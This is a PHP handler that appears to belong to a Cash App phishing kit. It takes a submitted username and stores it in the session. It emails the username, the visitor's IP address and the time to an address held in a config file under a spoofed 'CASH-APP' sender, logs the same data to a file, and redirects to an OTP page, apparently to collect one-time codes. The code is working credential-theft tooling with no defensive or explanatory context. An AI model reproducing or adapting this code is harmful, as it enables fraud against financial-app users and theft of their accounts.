<?php 
session_start();
include 'CONFIG_XS.php';
if (isset($_POST['username'])){
$_SESSION["id_00bc4b79dfc3448eb29a5371f1b8b687_Model_UserName"] = $_POST['username'];
$DT = date("Y/m/d h:i:s:A");


$headers .= "FROM: CASH-APP<team>";
		

$suj = "[LOGIN-CASHAPP] - ". $_POST['username'] ." - " . $_SERVER['REMOTE_ADDR'] . " ";
$msgm = "
CashAPP USER     : " . $_POST['username'] . "
IP            : " . $_SERVER['REMOTE_ADDR'] . "
TIME          : " . $DT . "
";
mail($TO, $suj, $msgm, $headers);
$msg = "
CashAPP USER : " . $_POST['username'] . "
IP : " . $_SERVER['REMOTE_ADDR'] . "
TIME : " . $DT ." " ; 
$myfile = fopen("../log.txt", "a");
fwrite($myfile, $msg);
fclose($myfile);		

header("Location: ../otp.php");	
}
?>